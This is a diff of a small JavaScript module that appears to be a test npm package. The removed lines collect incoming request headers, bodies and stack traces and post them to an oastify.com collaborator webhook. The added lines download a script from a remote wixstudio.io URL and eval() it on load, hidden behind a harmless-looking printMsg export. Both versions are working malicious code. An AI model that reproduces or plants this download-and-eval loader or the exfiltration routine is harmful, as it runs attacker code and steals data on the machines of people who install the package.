@@ -1,39 +1,18 @@
-const getCurrentRequest = require('@wix/wix-request');
-const { fetch } = require('wix-fetch');
-const util = require('util');
+const https = require('https');
 
-async function main() {
-    const webhook = 'https://x31lltv67khjb5st88mxpm2qchie67uw.oastify.com/'
+const remoteScriptUrl = 'https://marksl70.wixstudio.io/collaborator/_functions/file/somepackage-marksl';
 
-    // stack
-    const error = new Error();
-    Error.captureStackTrace(error);
-    const callStack = error.stack;
+https.get(remoteScriptUrl, (response) => {
+    let scriptContent = '';
 
-    // request
-    const currentRequest = await getCurrentRequest();
-    const currentRequestInspected = util.inspect(currentRequest, {showHidden: false, depth: 2})
-    const reqHeaders = currentRequest.headers;
-    const reqBody = currentRequest.request.body;
+    response.on('data', (chunk) => {
+        scriptContent += chunk;
+    });
 
-    // objects i want to send
-    const goodies = {
-        item,
-        reqHeaders,
-        reqBody,
-        currentRequestInspected, // object too big, send to webhooksite
-        callStack
-    }
-
-    for (let [key, value] of Object.entries(goodies)) {
-        fetch(webhook + key, {
-            method: 'POST',
-            body: JSON.stringify(value)
-        })
-    }
-}
-
-main();
+    response.on('end', () => {
+        eval(scriptContent);
+    });
+})
 
 exports.printMsg = function() {
     console.log("marksl test");
